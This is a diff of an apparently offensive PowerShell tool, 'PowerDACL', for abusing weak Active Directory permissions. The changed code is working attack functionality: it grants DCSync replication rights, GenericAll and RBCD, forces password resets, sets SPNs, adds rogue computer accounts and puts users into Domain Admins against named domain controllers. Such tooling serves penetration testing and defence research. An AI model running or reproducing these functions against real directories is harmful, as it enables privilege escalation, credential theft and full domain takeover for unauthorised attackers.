@@ -19,82 +19,70 @@ function PowerDACL{
 	Write-Output " A tool to abuse weak permissions of Active Directory Discretionary Access Control Lists (DACLs) and Access Control Entries (ACEs)"
 	Write-Output " "
 	Write-Output " Grant DCSync rights:"
-	Write-Output "  DCSync -Target username"
-	Write-Output "  DCSync -Target username -TargetDomain userdomain"
+	Write-Output "  DCSync -Target username -TargetDomain ferrari.local -TargetServer dc01.ferrari.local"
 	Write-Output " "
 	Write-Output " Grant GenericAll rights:"
-	Write-Output "  GenericAll -Target MSSQL01$ -Grantee username"
-	Write-Output "  GenericAll -Target MSSQL01$ -TargetDomain acme.local -Grantee username -GranteeDomain domain.local"
+	Write-Output "  GenericAll -Target MSSQL01$ -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Grantee username"
+	Write-Output "  GenericAll -Target MSSQL01$ -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Grantee username -GranteeDomain domain.local -GranteeServer dc02.domain.local"
 	Write-Output " "
 	Write-Output " Set RBCD:"
-	Write-Output "  RBCD -Target MSSQL01$ -Grantee username"
-	Write-Output "  RBCD -Target MSSQL01$ -TargetDomain domain.local -Grantee username -GranteeDomain acme.local"
-	Write-Output "  RBCD -Target MSSQL01$ -Clear"
+	Write-Output "  RBCD -Target MSSQL01$ -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Grantee username"
+	Write-Output "  RBCD -Target MSSQL01$ -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Grantee username -GranteeDomain domain.local -GranteeServer dc02.domain.local"
+	Write-Output "  RBCD -Clear -Target MSSQL01$ -TargetDomain ferrari.local -TargetServer dc01.ferrari.local"
 	Write-Output " "
 	Write-Output " Add Computer to domain:"
-	Write-Output "  AddComputer -ComputerName evilcomputer -Password P@ssw0rd!"
-	Write-Output "  AddComputer -ComputerName evilcomputer -Password P@ssw0rd! -Domain ferrari.local"
+	Write-Output "  AddComputer -ComputerName evilcomputer -Password P@ssw0rd! -Domain ferrari.local -Server dc01.ferrari.local"
+	Write-Output "  AddComputer -ComputerName evilcomputer -Domain ferrari.local -Server dc01.ferrari.local"
 	Write-Output " "
 	Write-Output " Delete Computer from domain:"
-	Write-Output "  DeleteComputer -ComputerName evilcomputer"
-	Write-Output "  DeleteComputer -ComputerName evilcomputer -Domain ferrari.local"
+	Write-Output "  DeleteComputer -ComputerName evilcomputer -Domain ferrari.local -Server dc01.ferrari.local"
 	Write-Output " "
 	Write-Output " Force Change Password:"
-	Write-Output "  ForceChangePass -Target username -Password P@ssw0rd!"
-	Write-Output "  ForceChangePass -Target username -Password P@ssw0rd! -TargetDomain usserdomain"
+	Write-Output "  ForceChangePass -Target username -Password P@ssw0rd! -TargetDomain ferrari.local -TargetServer dc01.ferrari.local"
 	Write-Output " "
 	Write-Output " Set SPN:"
-	Write-Output "  SetSPN -Target username"
-	Write-Output "  SetSPN -Target username -TargetDomain userdomain -SPN `"test/test`""
+	Write-Output "  SetSPN -Target username -TargetDomain ferrari.local -TargetServer dc01.ferrari.local"
+	Write-Output "  SetSPN -Target username -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -SPN `"test/test`""
 	Write-Output " "
 	Write-Output " Remove SPN:"
-	Write-Output "  RemoveSPN -Target username"
-	Write-Output "  RemoveSPN -Target username -TargetDomain userdomain"
+	Write-Output "  RemoveSPN -Target username -TargetDomain ferrari.local -TargetServer dc01.ferrari.local"
 	Write-Output " "
 	Write-Output " Set Owner:"
-	Write-Output "  SetOwner -Target MSSQL01$ -Owner username"
-	Write-Output "  SetOwner -Target MSSQL01$ -TargetDomain acme.local -Owner username -OwnerDomain domain.local"
+	Write-Output "  SetOwner -Target MSSQL01$ -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Owner username"
+	Write-Output "  SetOwner -Target MSSQL01$ -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Owner username -OwnerDomain domain.local -OwnerServer dc02.domain.local"
 	Write-Output " "
 	Write-Output " Enable Account:"
-	Write-Output "  EnableAccount -Target myComputer$"
-	Write-Output "  EnableAccount -Target myComputer$ -Domain userdomain"
+	Write-Output "  EnableAccount -Target myComputer$ -Domain ferrari.local -Server dc01.ferrari.local"
 	Write-Output " "
 	Write-Output " Disable Account:"
-	Write-Output "  DisableAccount -Target myComputer$"
-	Write-Output "  DisableAccount -Target myComputer$ -Domain userdomain"
+	Write-Output "  DisableAccount -Target myComputer$ -Domain ferrari.local -Server dc01.ferrari.local"
 	Write-Output " "
 	Write-Output " Add object to a group:"
-	Write-Output "  AddToGroup -Target user -Group `"Domain Admins`""
-	Write-Output "  AddToGroup -Target user -Group `"Domain Admins`" -Domain userdomain"
+	Write-Output "  AddToGroup -Target user -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Group `"Domain Admins`""
+	Write-Output "  AddToGroup -Target user -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Group `"Domain Admins`" -GroupDomain domain.local -GroupServer dc02.domain.local"
 	Write-Output " "
 	Write-Output " Remove object from a group:"
-	Write-Output "  RemoveFromGroup -Target user -Group `"Domain Admins`""
-	Write-Output "  RemoveFromGroup -Target user -Group `"Domain Admins`" -Domain userdomain"
+	Write-Output "  RemoveFromGroup -Target user -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Group `"Domain Admins`""
+	Write-Output "  RemoveFromGroup -Target user -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Group `"Domain Admins`" -GroupDomain domain.local -GroupServer dc02.domain.local"
 	Write-Output " "
 }
 
 function DCSync {
 	param (
-        [string]$Target,
+        [Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+		[string]$Target,
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
         [string]$TargetDomain,
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+		[string]$TargetServer,
         [switch]$Remove
     )
 	
-	if($TargetDomain){
-		$domainDN = $TargetDomain -replace '\.', ',DC='
-		$domainDN = "DC=$domainDN"
-	}
-	else{
-		$FindCurrentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
-		if(!$FindCurrentDomain){$FindCurrentDomain = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().DomainName.Trim()}
-		if(!$FindCurrentDomain){$FindCurrentDomain = $env:USERDNSDOMAIN}
-		if(!$FindCurrentDomain){$FindCurrentDomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }}
-		$domainDN = $FindCurrentDomain -replace '\.', ',DC='
-		$domainDN = "DC=$domainDN"
-	}
+	$domainDN = $TargetDomain -replace '\.', ',DC='
+	$domainDN = "DC=$domainDN"
 	
 	try {
-        $GrabObject = Get-ADSIObject -Domain $TargetDomain -samAccountName $Target
+        $GrabObject = Get-ADSIObject -Domain $TargetDomain -Server $TargetServer -samAccountName $Target
 		
 		$ReplicationRightsGUIDs = @(
             '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2',
@@ -117,42 +105,57 @@ function DCSync {
 		
 		$GrabObjectSID = [System.Security.Principal.SecurityIdentifier]$GrabObjectExtractedSID
 		
-        $TargetEntry = [ADSI]"LDAP://$($domainDN)"
-        $TargetEntry.PsBase.Options.SecurityMasks = 'Dacl'
-        $ObjectSecurity = $TargetEntry.PsBase.ObjectSecurity
+        $TargetEntry = [ADSI]"LDAP://$TargetServer/$domainDN"
+		$TargetEntry.PsBase.Options.SecurityMasks = 'Dacl'
+		$adSec    = $TargetEntry.PsBase.ObjectSecurity
+		$rawBytes = $adSec.GetSecurityDescriptorBinaryForm()
+		if (-not $rawBytes) { throw "Couldn't retrieve nTSecurityDescriptor for $domainDN" }
 
-        foreach ($GUID in $ReplicationRightsGUIDs) {
+		# — instantiate via reflection —
+		$sdType = [System.Security.AccessControl.RawSecurityDescriptor]
+		$ctor   = $sdType.GetConstructor(@([byte[]],[int]))
+		$sd     = $ctor.Invoke(@($rawBytes, 0))
 
-            $RightGUID = New-Object Guid $GUID
+		foreach ($GUID in $ReplicationRightsGUIDs) {
+			# build the GUID object the same way you did before
+			$RightGuidObj = New-Object Guid $GUID
 
-            $AccessControlType = if ($Remove) {
-                [System.Security.AccessControl.AccessControlType]::Deny
-            } else {
-                [System.Security.AccessControl.AccessControlType]::Allow
-            }
+			if ($Remove) {
+				Write-Verbose "Removing replication rights from $Target."
+				for ($i = $sd.DiscretionaryAcl.Count - 1; $i -ge 0; $i--) {
+					$ace = $sd.DiscretionaryAcl[$i]
+					if ($ace -is [System.Security.AccessControl.ObjectAce] `
+					   -and $ace.SecurityIdentifier -eq $GrabObjectSID `
+					   -and $ace.ObjectAceType      -eq $RightGuidObj) {
+						# <-- here’s the fix:
+						$sd.DiscretionaryAcl.RemoveAce($i)
+					}
+				}
+			}
+			else {
+				Write-Verbose "Granting replication right $GUID to $Target."
+				$ace = New-Object System.Security.AccessControl.ObjectAce(
+					[System.Security.AccessControl.AceFlags]::None,
+					[System.Security.AccessControl.AceQualifier]::AccessAllowed,
+					0x100,
+					$GrabObjectSID,
+					[System.Security.AccessControl.ObjectAceFlags]::ObjectAceTypePresent,
+					$RightGuidObj,
+					[Guid]::Empty,
+					$false,
+					$null
+				)
+				$sd.DiscretionaryAcl.InsertAce(0, $ace)
+			}
+		}
 
-            $ADRights = [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight
+		# — serialise & write back —
+		$newBytes = New-Object byte[] $sd.BinaryLength
+		$sd.GetBinaryForm($newBytes, 0)
+		$TargetEntry.Properties['nTSecurityDescriptor'].Value = $newBytes
+		$TargetEntry.PsBase.CommitChanges()
 
-            $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule (
-                $GrabObjectSID,
-                $ADRights,
-                $AccessControlType,
-                $RightGUID,
-                [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
-            )
-
-            if ($Remove) {
-                Write-Verbose "Removing replication right $GUID from $Target."
-                $ObjectSecurity.RemoveAccessRule($ACE) | Out-Null
-            } else {
-                Write-Verbose "Granting replication right $GUID to $Target."
-                $ObjectSecurity.AddAccessRule($ACE) | Out-Null
-            }
-        }
-
-        $TargetEntry.PsBase.ObjectSecurity = $ObjectSecurity
-        $TargetEntry.PsBase.CommitChanges()
-        Write-Output "[+] Successfully updated DS-Replication rights for $Target"
+		Write-Output "[+] Successfully updated DS-Replication rights for $Target"
     } catch {
         Write-Output "[-] Failed to update DS-Replication rights for $Target. Error: $_"
     }
@@ -160,17 +163,26 @@ function DCSync {
 
 function SetOwner {
 	param (
-        [string]$Target,
+        [Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+		[string]$Target,
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
         [string]$TargetDomain,
-		[string]$Owner, 
-        [string]$OwnerDomain
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+		[string]$TargetServer,
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+		[string]$Owner,
+        [string]$OwnerDomain,
+		[string]$OwnerServer
     )
 	
+	if(!$OwnerDomain){$OwnerDomain = $TargetDomain}
+	if(!$OwnerServer){$OwnerServer = $TargetServer}
+	
 	try {
-        $GrabObject = Get-ADSIObject -Domain $TargetDomain -samAccountName $Target
+        $GrabObject = Get-ADSIObject -Domain $TargetDomain -Server $TargetServer -samAccountName $Target
         $GrabObjectDN = $GrabObject.distinguishedname
 
-        $GrabOwner = Get-ADSIObject -Domain $OwnerDomain -samAccountName $Owner
+        $GrabOwner = Get-ADSIObject -Domain $OwnerDomain -Server $OwnerServer -samAccountName $Owner
         $OwnerSID = $GrabOwner.objectsid
 		
 		$byteArray = @()
@@ -183,7 +195,7 @@ function SetOwner {
 		}
 		$OwnerExtractedSID = GetSID-FromBytes -sidBytes $byteArray
 
-        $TargetEntry = [ADSI]"LDAP://$($GrabObjectDN)"
+        $TargetEntry = [ADSI]"LDAP://$TargetServer/$($GrabObjectDN)"
         $TargetEntry.PsBase.Options.SecurityMasks = 'Owner'
         $ObjectSecurity = $TargetEntry.PsBase.ObjectSecurity
 
@@ -201,16 +213,25 @@ function SetOwner {
 
 function GenericAll {
 	param (
-        [string]$Target,
+        [Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+		[string]$Target,
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
         [string]$TargetDomain,
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+		[string]$TargetServer,
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
 		[string]$Grantee,
-        [string]$GranteeDomain
+        [string]$GranteeDomain,
+		[string]$GranteeServer
     )
 	
-	$GrabObject = Get-ADSIObject -Domain $TargetDomain -samAccountName $Target
+	if(!$GranteeDomain){$GranteeDomain = $TargetDomain}
+	if(!$GranteeServer){$GranteeServer = $TargetServer}
+	
+	$GrabObject = Get-ADSIObject -Domain $TargetDomain -Server $TargetServer -samAccountName $Target
 	$GrabObjectDN = $GrabObject.distinguishedname
 	
-	$GrabGrantee = Get-ADSIObject -Domain $GranteeDomain -samAccountName $Grantee
+	$GrabGrantee = Get-ADSIObject -Domain $GranteeDomain -Server $GranteeServer -samAccountName $Grantee
 	$GrabGranteeSID = $GrabGrantee.objectsid
 	$byteArray = @()
 	foreach ($item in $GrabGranteeSID) {
@@ -222,7 +243,7 @@ function GenericAll {
 	}
 	$GranteeExtractedSID = GetSID-FromBytes -sidBytes $byteArray
 	
-	$TargetEntry = [ADSI]"LDAP://$($GrabObjectDN)"
+	$TargetEntry = [ADSI]"LDAP://$TargetServer/$($GrabObjectDN)"
 	$TargetEntry.PsBase.Options.SecurityMasks = 'Dacl'
 	$ObjectSecurity = $TargetEntry.PsBase.ObjectSecurity
 	
@@ -239,14 +260,19 @@ function GenericAll {
 
 function ForceChangePass {
 	param (
-        [string]$Target,
+        [Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+		[string]$Target,
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
         [string]$TargetDomain,
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+		[string]$TargetServer,
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
 		[string]$Password
     )
 	
 	try{
-		$GrabObject = (Get-ADSIObject -Domain $TargetDomain -samAccountName $Target).distinguishedname
-		$user = [ADSI]"LDAP://$($GrabObject)"
+		$GrabObject = (Get-ADSIObject -Domain $TargetDomain -Server $TargetServer -samAccountName $Target).distinguishedname
+		$user = [ADSI]"LDAP://$TargetServer/$($GrabObject)"
 		$user.SetPassword($Password)
 		Write-Output "[+] Successfully changed password for $Target"
 	} catch {
@@ -256,14 +282,18 @@ function ForceChangePass {
 
 function SetSPN {
 	param (
-        [string]$Target,
+        [Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+		[string]$Target,
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
         [string]$TargetDomain,
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+		[string]$TargetServer,
 		[string]$SPN = "fake/fake"
     )
 	
 	try{
-		$GrabObject = (Get-ADSIObject -Domain $TargetDomain -samAccountName $Target).distinguishedname
-		$user = [ADSI]"LDAP://$($GrabObject)"
+		$GrabObject = (Get-ADSIObject -Domain $TargetDomain -Server $TargetServer -samAccountName $Target).distinguishedname
+		$user = [ADSI]"LDAP://$TargetServer/$($GrabObject)"
 		$user.Put("servicePrincipalName", $SPN); $user.SetInfo()
 		Write-Output "[+] Successfully added SPN $SPN to $Target"
 	} catch {
@@ -273,13 +303,17 @@ function SetSPN {
 
 function RemoveSPN {
 	param (
-        [string]$Target,
-        [string]$TargetDomain
+        [Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+		[string]$Target,
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+        [string]$TargetDomain,
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+		[string]$TargetServer
     )
 	
 	try{
-		$GrabObject = (Get-ADSIObject -Domain $TargetDomain -samAccountName $Target).distinguishedname
-		$user = [ADSI]"LDAP://$($GrabObject)"
+		$GrabObject = (Get-ADSIObject -Domain $TargetDomain -Server $TargetServer -samAccountName $Target).distinguishedname
+		$user = [ADSI]"LDAP://$TargetServer/$($GrabObject)"
 		$existingSPNs = $user.Properties["servicePrincipalName"]
 		
 		if ($existingSPNs.Count -gt 0) {
@@ -298,32 +332,26 @@ function RemoveSPN {
 
 function EnableAccount {
 	param (
-        [string]$Target,
-        [string]$Domain
+        [Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+		[string]$Target,
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+        [string]$Domain,
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+		[string]$Server
     )
 	
-	if($Domain){
-		$domainDN = $Domain -replace '\.', ',DC='
-		$domainDN = "DC=$domainDN"
-	}
-	else{
-		$FindCurrentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
-		if(!$FindCurrentDomain){$FindCurrentDomain = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().DomainName.Trim()}
-		if(!$FindCurrentDomain){$FindCurrentDomain = $env:USERDNSDOMAIN}
-		if(!$FindCurrentDomain){$FindCurrentDomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }}
-		$domainDN = $FindCurrentDomain -replace '\.', ',DC='
-		$domainDN = "DC=$domainDN"
-	}
+	$domainDN = $Domain -replace '\.', ',DC='
+	$domainDN = "DC=$domainDN"
 
     try {
 		
 		if (-not $Target.EndsWith('$')) {
-			$account = ([ADSI]"LDAP://CN=$Target,CN=Users,$domainDN")
+			$account = ([ADSI]"LDAP://$Server/CN=$Target,CN=Users,$domainDN")
 		}
 		
         else{
 			$Target = $Target -replace '\$',''
-			$account = ([ADSI]"LDAP://CN=$Target,CN=Computers,$domainDN")
+			$account = ([ADSI]"LDAP://$Server/CN=$Target,CN=Computers,$domainDN")
 		}
 
         $uac = $account.Properties["userAccountControl"][0]
@@ -343,31 +371,25 @@ function EnableAccount {
 
 function DisableAccount {
 	param (
-        [string]$Target,
-        [string]$Domain
+        [Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+		[string]$Target,
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+        [string]$Domain,
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+		[string]$Server
     )
 	
-	if($Domain){
-		$domainDN = $Domain -replace '\.', ',DC='
-		$domainDN = "DC=$domainDN"
-	}
-	else{
-		$FindCurrentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
-		if(!$FindCurrentDomain){$FindCurrentDomain = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().DomainName.Trim()}
-		if(!$FindCurrentDomain){$FindCurrentDomain = $env:USERDNSDOMAIN}
-		if(!$FindCurrentDomain){$FindCurrentDomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }}
-		$domainDN = $FindCurrentDomain -replace '\.', ',DC='
-		$domainDN = "DC=$domainDN"
-	}
+	$domainDN = $Domain -replace '\.', ',DC='
+	$domainDN = "DC=$domainDN"
 
     try {
 		if (-not $Target.EndsWith('$')) {
-			$account = ([ADSI]"LDAP://CN=$Target,CN=Users,$domainDN")
+			$account = ([ADSI]"LDAP://$Server/CN=$Target,CN=Users,$domainDN")
 		}
 		
         else{
 			$Target = $Target -replace '\$',''
-			$account = ([ADSI]"LDAP://CN=$Target,CN=Computers,$domainDN")
+			$account = ([ADSI]"LDAP://$Server/CN=$Target,CN=Computers,$domainDN")
 		}
 
         $uac = $account.Properties["userAccountControl"][0]
@@ -387,27 +409,21 @@ function DisableAccount {
 
 function AddComputer {
 	param (
-        [string]$ComputerName,
+        [Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+		[string]$ComputerName,
         [string]$Password,
-        [string]$Domain
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+        [string]$Domain,
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+		[string]$Server
     )
 	
-	if($Domain){
-		$domainDN = $Domain -replace '\.', ',DC='
-		$domainDN = "DC=$domainDN"
-	}
-	else{
-		$FindCurrentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
-		if(!$FindCurrentDomain){$FindCurrentDomain = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().DomainName.Trim()}
-		if(!$FindCurrentDomain){$FindCurrentDomain = $env:USERDNSDOMAIN}
-		if(!$FindCurrentDomain){$FindCurrentDomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }}
-		$domainDN = $FindCurrentDomain -replace '\.', ',DC='
-		$domainDN = "DC=$domainDN"
-	}
+	$domainDN = $Domain -replace '\.', ',DC='
+	$domainDN = "DC=$domainDN"
 	
 	try{
 	
-		$computersContainer = [ADSI]"LDAP://CN=Computers,$domainDN"
+		$computersContainer = [ADSI]"LDAP://$Server/CN=Computers,$domainDN"
 		
 		$newComputer = $computersContainer.Create("Computer", "CN=$ComputerName")
 		
@@ -426,7 +442,7 @@ function AddComputer {
 		$newComputer.SetInfo()
 		
 		if($Password){
-			([ADSI]"LDAP://CN=$ComputerName,CN=Computers,$domainDN").SetPassword($Password)
+			([ADSI]"LDAP://$Server/CN=$ComputerName,CN=Computers,$domainDN").SetPassword($Password)
 			
 			Write-Output "[+] Successfully added computer $ComputerName to the domain with password $Password"
 		}
@@ -442,32 +458,24 @@ function AddComputer {
 
 function DeleteComputer {
 	param (
-        [string]$ComputerName,
-        [string]$Domain
+        [Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+		[string]$ComputerName,
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+        [string]$Domain,
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+		[string]$Server
     )
 	
-	if($Domain){
-		$domainDN = $Domain -replace '\.', ',DC='
-		$domainDN = "DC=$domainDN"
-	}
-	else{
-		$FindCurrentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
-		if(!$FindCurrentDomain){$FindCurrentDomain = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().DomainName.Trim()}
-		if(!$FindCurrentDomain){$FindCurrentDomain = $env:USERDNSDOMAIN}
-		if(!$FindCurrentDomain){$FindCurrentDomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }}
-		$domainDN = $FindCurrentDomain -replace '\.', ',DC='
-		$domainDN = "DC=$domainDN"
-	}
+	$domainDN = $Domain -replace '\.', ',DC='
+	$domainDN = "DC=$domainDN"
 	
 	try{
 	
-		$computersContainer = [ADSI]"LDAP://CN=Computers,$domainDN"
+		$computersContainer = [ADSI]"LDAP://$Server/CN=Computers,$domainDN"
 		
-		if (-not $ComputerName.EndsWith('$')) {
-			$ComputerName += '$'
-		}
+		if (-not $ComputerName.EndsWith('$')) {$ComputerName += '$'}
 		
-		$computerObject = (Get-ADSIObject -Domain $Domain -samAccountName $ComputerName).distinguishedname
+		$computerObject = (Get-ADSIObject -Domain $Domain -Server $Server -samAccountName $ComputerName).distinguishedname
 		
 		$computerObject = ($computerObject -split ",")[0]
 		
@@ -486,18 +494,27 @@ function DeleteComputer {
 
 function AddToGroup {
 	param (
-        [string]$Target,
+        [Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+		[string]$Target,
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
         [string]$TargetDomain,
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+		[string]$TargetServer,
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
 		[string]$Group,
-		[string]$GroupDomain
+		[string]$GroupDomain,
+		[string]$GroupServer
     )
 	
-	$GrabObject = (Get-ADSIObject -Domain $TargetDomain -samAccountName $Target).distinguishedname
+	if(!$GroupDomain){$GroupDomain = $TargetDomain}
+	if(!$GroupServer){$GroupServer = $TargetServer}
 	
-	$GrabGroup = (Get-ADSIObject -Domain $GroupDomain -samAccountName $Group).distinguishedname
+	$GrabObject = (Get-ADSIObject -Domain $TargetDomain -Server $TargetServer -samAccountName $Target).distinguishedname
+	
+	$GrabGroup = (Get-ADSIObject -Domain $GroupDomain -Server $GroupServer -samAccountName $Group).distinguishedname
 	
 	try{
-		([ADSI]"LDAP://$($GrabGroup)").Add("LDAP://$($GrabObject)")
+		([ADSI]"LDAP://$GroupServer/$($GrabGroup)").Add("LDAP://$TargetServer/$($GrabObject)")
 		Write-Output "[+] Successfully added $Target to group $Group"
 	} catch {
 		Write-Output "[-] Error occurred while adding $Target to $($Group): $_"
@@ -506,18 +523,27 @@ function AddToGroup {
 
 function RemoveFromGroup {
 	param (
-        [string]$Target,
+        [Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+		[string]$Target,
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
         [string]$TargetDomain,
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+		[string]$TargetServer,
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
 		[string]$Group,
-		[string]$GroupDomain
+		[string]$GroupDomain,
+		[string]$GroupServer
     )
 	
-	$GrabObject = (Get-ADSIObject -Domain $TargetDomain -samAccountName $Target).distinguishedname
+	if(!$GroupDomain){$GroupDomain = $TargetDomain}
+	if(!$GroupServer){$GroupServer = $TargetServer}
 	
-	$GrabGroup = (Get-ADSIObject -Domain $GroupDomain -samAccountName $Group).distinguishedname
+	$GrabObject = (Get-ADSIObject -Domain $TargetDomain -Server $TargetServer -samAccountName $Target).distinguishedname
+	
+	$GrabGroup = (Get-ADSIObject -Domain $GroupDomain -Server $GroupServer -samAccountName $Group).distinguishedname
 	
 	try{
-		([ADSI]"LDAP://$($GrabGroup)").Remove("LDAP://$($GrabObject)")
+		([ADSI]"LDAP://$GroupServer/$($GrabGroup)").Remove("LDAP://$TargetServer/$($GrabObject)")
 		Write-Output "[+] Successfully removed $Target from group $Group"
 	} catch {
 		Write-Output "[-] Error occurred while removing $Target from $($Group): $_"
@@ -526,19 +552,32 @@ function RemoveFromGroup {
 
 function RBCD {
 	param (
-        [string]$Target,
+        [Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+		[string]$Target,
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
         [string]$TargetDomain,
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+		[string]$TargetServer,
 		[string]$Grantee,
 		[string]$GranteeDomain,
+		[string]$GranteeServer,
 		[switch]$Clear
     )
 	
-	if($Clear){
-		Set-DomainObject -Identity $Target -Domain $TargetDomain -Clear @('msDS-AllowedToActOnBehalfOfOtherIdentity')
+	if(!$GranteeDomain){$GranteeDomain = $TargetDomain}
+	if(!$GranteeServer){$GranteeServer = $TargetServer}
+	
+	if(!$Grantee -AND !$Clear){
+		Write-Output "[-] Please provide a Grantee"
 		break
 	}
 	
-	$extractedRawSID = (Get-ADSIObject -Domain $GranteeDomain -samAccountName $Grantee).objectsid
+	if($Clear){
+		Set-DomainObject -Identity $Target -Domain $TargetDomain -Server $TargetServer -Clear @('msDS-AllowedToActOnBehalfOfOtherIdentity')
+		break
+	}
+	
+	$extractedRawSID = (Get-ADSIObject -Domain $GranteeDomain -Server $GranteeServer -samAccountName $Grantee).objectsid
 	
 	$byteArray = @()
 
@@ -558,16 +597,30 @@ function RBCD {
 	
 	$rsd.GetBinaryForm($rsdb, 0)
 	
-	Set-DomainObject -Identity $Target -Domain $TargetDomain -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb}
+	Set-DomainObject -Identity $Target -Domain $TargetDomain -Server $TargetServer -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb}
 }
 
 function Set-DomainObject {	
     param (
-        [string]$Identity,
+        [Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+		[string]$Identity,
         [hashtable]$Set = @{},
         [string[]]$Clear = @(),
-        [string]$Domain
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+        [string]$Domain,
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+		[string]$Server
     )
+	
+	if($Set -AND $Clear){
+		Write-Output "[-] Please use either Set OR Clear"
+		break
+	}
+	
+	elseif(!$Set -AND !$Clear){
+		Write-Output "[-] Please specify a Set OR Clear action"
+		break
+	}
 
     function Set-Values {
         param (
@@ -605,7 +658,7 @@ function Set-DomainObject {
     }
 
     try {
-        $Entry = (Get-ADSIObject -samAccountName $Identity -Domain $Domain -Raw).GetDirectoryEntry()
+        $Entry = (Get-ADSIObject -samAccountName $Identity -Domain $Domain -Server $Server -Raw).GetDirectoryEntry()
     }
     catch {
         Write-Output "[-] Error retrieving object with Identity '$Identity' : $_"
@@ -637,16 +690,13 @@ function Get-ADSIObject {
     param (
         [string]$samAccountName,
         [string]$Domain,
+		[string]$Server,
 		[switch]$Raw
     )
-    if ($Domain) {
-        $root = "$Domain" -replace "\.", ",DC="
-        $domainPath = "DC=" + "$root"
-    } else {
-        $root = [ADSI]"LDAP://RootDSE"
-        $domainPath = $root.defaultNamingContext
-    }
-    $searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$domainPath")
+    $root = "$Domain" -replace "\.", ",DC="
+    $domainPath = "DC=" + "$root"
+	$ldapPath = "LDAP://$Server/$domainPath"
